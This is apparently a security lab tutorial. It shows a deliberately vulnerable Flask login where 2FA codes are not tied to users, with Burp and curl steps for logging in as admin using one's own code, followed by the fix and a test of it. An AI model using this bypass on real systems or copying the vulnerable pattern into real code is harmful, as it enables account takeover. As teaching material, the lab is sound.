# Lab 4 — 2FA Bypass (Unbound 2FA Code)

## Overview

Two-Factor Authentication (2FA) adds a second verification step after password authentication. Typically, a one-time code is sent to the user's email or phone, and the user must enter it to complete login.

However, if the 2FA code is validated independently from the user's identity, an attacker can use their own valid 2FA code to authenticate as a different user — effectively bypassing the second factor entirely.

**Scenario:** You have obtained admin's credentials through a previous breach (e.g., credential leak), but admin has 2FA enabled and you don't have access to admin's mailbox. You DO have access to your own account and mailbox.

## Step 1 — Analyze the Code

Open `app/app.py` and look at the `/login2` endpoint (lines ~75-96):

```python
@app.route('/login2', methods=['POST'])
def login2():
    username = request.form['username']
    password = request.form['password']
    code = request.form['2fa_code']

    conn = get_db()
    # VULNERABLE: Checks code validity and credentials independently
    # Does NOT verify the code was issued for this specific user
    code_valid = conn.execute("SELECT * FROM tfa_codes WHERE code=? AND expired=0", (code,)).fetchone()
    user_valid = conn.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password)).fetchone()

    if code_valid and user_valid:
        conn.execute("UPDATE tfa_codes SET expired=1 WHERE code=?", (code,))
        conn.commit()
        session['username'] = username
        session['role'] = user_valid['role']
        return redirect(url_for('dashboard'))
```

**Why this is vulnerable:**
1. `code_valid` checks if the 2FA code exists and is not expired — but NOT who it was issued for
2. `user_valid` checks if the username/password are correct — standard credential check
3. These two checks are **independent** — the code could belong to user A while the credentials belong to user B
4. The hidden form fields in `verify_2fa.html` pass `username` and `password` back — these can be modified

Also note the login flow in `verify_2fa.html`:
```html
<input type="hidden" name="username" value="{{ username }}">
<input type="hidden" name="password" value="{{ password }}">
```

The credentials are passed as hidden fields that can be intercepted and modified.

## Step 2 — Exploit the Vulnerability

### Prerequisites
- Start the lab: `docker compose up --build`
- App is at: `http://localhost:5004`
- Mailbox is at: `http://localhost:5014`

### Step 2.1 — Login as your user to trigger a 2FA code

1. Go to `http://localhost:5004`
2. Login with `user` / `password`
3. You see the "Two-Factor Authentication" page asking for a 6-digit code
4. **Do NOT submit the code yet** — we need to modify the request

### Step 2.2 — Get the 2FA code from the mailbox

1. Open `http://localhost:5014` in another tab
2. You'll see an email to `user@company.com` with subject "Your 2FA Code"
3. Open the email — note the 6-digit code (e.g., `483921`)

[Screenshot: Mailbox showing the 2FA code email for user@company.com]

### Step 2.3 — Exploit using Burp Suite

1. Configure your browser to use Burp Suite as a proxy
2. On the 2FA page, enter the code and click "Verify"
3. Burp intercepts the `POST /login2` request. It looks like:
   ```
   POST /login2 HTTP/1.1
   Host: localhost:5004
   Content-Type: application/x-www-form-urlencoded

   username=user&password=password&2fa_code=483921
   ```
4. **Modify the request** — change the username and password to admin's credentials:
   ```
   username=admin&password=adminpass&2fa_code=483921
   ```
5. Forward the modified request
6. You are now logged in as `admin`!

[Screenshot: Admin dashboard showing "Welcome, admin!" with admin badge]

### Step 2.4 — Exploit via curl (alternative)

```bash
# Step 1: Login as 'user' to trigger a 2FA code
curl -X POST http://localhost:5004/login \
  -d "username=user&password=password" \
  -c cookies.txt

# Step 2: Get the 2FA code from the mailbox
# Visit http://localhost:5014 and note the code, or:
CODE=$(curl -s http://localhost:5014/ | grep -oP '\d{6}' | tail -1)
echo "2FA Code: $CODE"

# Step 3: Submit /login2 with ADMIN credentials but USER's 2FA code
curl -X POST http://localhost:5004/login2 \
  -d "username=admin&password=adminpass&2fa_code=${CODE}" \
  -c cookies.txt \
  -L

# Step 4: Access admin dashboard
curl -b cookies.txt http://localhost:5004/dashboard
```

The response should show "Welcome, admin!" with the admin badge and admin controls.

## Step 3 — Discuss & Implement the Fix

### The Problem
The `/login2` endpoint validates the 2FA code and credentials independently. The code is not bound to the user who requested it.

### The Fix
Bind the 2FA code to the user by adding `AND username=?` to the code validation query.

**Before** (`app/app.py`, line ~84):
```python
code_valid = conn.execute("SELECT * FROM tfa_codes WHERE code=? AND expired=0", (code,)).fetchone()
user_valid = conn.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password)).fetchone()
```

**After:**
```python
code_valid = conn.execute("SELECT * FROM tfa_codes WHERE code=? AND username=? AND expired=0", (code, username)).fetchone()
user_valid = conn.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password)).fetchone()
```

### Why This Works
By adding `AND username=?`, the query ensures the 2FA code was actually generated for the user whose credentials are being submitted. If an attacker submits `user`'s 2FA code with `admin`'s credentials, the code check fails because the code was issued for `user`, not `admin`.

**Additional best practices (defense-in-depth):**
- Don't re-transmit credentials in hidden form fields — store the authenticated user in a server-side session after step 1
- Use short-lived codes (5 minutes or less)
- Rate-limit code attempts to prevent brute-force
- Use TOTP (time-based codes) with per-user secrets instead of server-generated codes
- Log and alert on repeated failed 2FA attempts

## Step 4 — Verify the Fix

1. Apply the fix in `app/app.py`: add `AND username=?` and pass `username` to the code validation query
2. Restart: `docker compose down && docker compose up --build`
3. Login as `user` / `password` to trigger a 2FA code
4. Get the code from the mailbox
5. Attempt the bypass:
   ```bash
   curl -X POST http://localhost:5004/login2 \
     -d "username=admin&password=adminpass&2fa_code=${CODE}" \
     -c cookies.txt -L
   ```
6. Result: "Invalid 2FA code" error — the code doesn't match `admin`
7. Verify normal flow works: submit the code with `user` credentials — login succeeds

[Screenshot: 2FA page showing "Invalid 2FA code" when credentials are swapped]

**Remember to revert the fix** so the lab ships in its vulnerable state.
